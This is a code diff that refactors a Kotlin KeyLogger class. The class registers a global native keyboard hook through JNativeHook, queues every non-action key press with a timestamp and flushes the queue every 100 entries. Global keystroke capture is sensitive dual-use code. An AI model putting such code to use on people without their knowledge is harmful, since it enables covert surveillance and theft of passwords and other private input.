@@ -23,8 +23,7 @@ class KeyLogger(username: String) : Logger, NativeKeyListener {
 
     override fun start() {
         try {
-            if (!GlobalScreen.isNativeHookRegistered())
-                GlobalScreen.registerNativeHook()
+            if (!GlobalScreen.isNativeHookRegistered()) GlobalScreen.registerNativeHook()
         } catch (ex: NativeHookException) {
             System.err.println("There was a problem registering the native hook.")
             exitProcess(1)
@@ -45,15 +44,17 @@ class KeyLogger(username: String) : Logger, NativeKeyListener {
     override fun stop() {
         clearQueue()
 
-        GlobalScreen.removeNativeKeyListener(this)
-        GlobalScreen.unregisterNativeHook()
+        try {
+            GlobalScreen.removeNativeKeyListener(this)
+            GlobalScreen.unregisterNativeHook()
+        } catch (e: Exception) {
+        }
     }
 
     override fun nativeKeyPressed(e: NativeKeyEvent) {
         if (!e.isActionKey) {
             queueToWrite.add(
-                "key=${NativeKeyEvent.getKeyText(e.keyCode)}," +
-                        " timestamp=${System.currentTimeMillis()}\n"
+                "key=${NativeKeyEvent.getKeyText(e.keyCode)}," + " timestamp=${System.currentTimeMillis()}\n"
             )
             if (queueToWrite.size == 100) {
                 clearQueue()
